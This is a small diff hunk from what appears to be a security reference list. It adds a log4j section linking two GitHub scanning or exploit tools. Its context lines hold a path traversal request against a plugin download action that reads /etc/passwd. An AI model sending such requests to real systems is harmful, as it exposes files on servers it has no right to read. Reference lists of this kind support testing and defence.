@@ -87,8 +87,8 @@ https://cxsecurity.com/issue/WLB-2021120012
 http://localhost/MYzoomsounds/?action=dzsap_download&link=../../../../../../../../../../etc/passwd
 ```
 
-
-
-
+## log4j
+https://github.com/0xInfection/LogMePwn
+https://github.com/adilsoybali/Log4j-RCE-Scanner
 
 
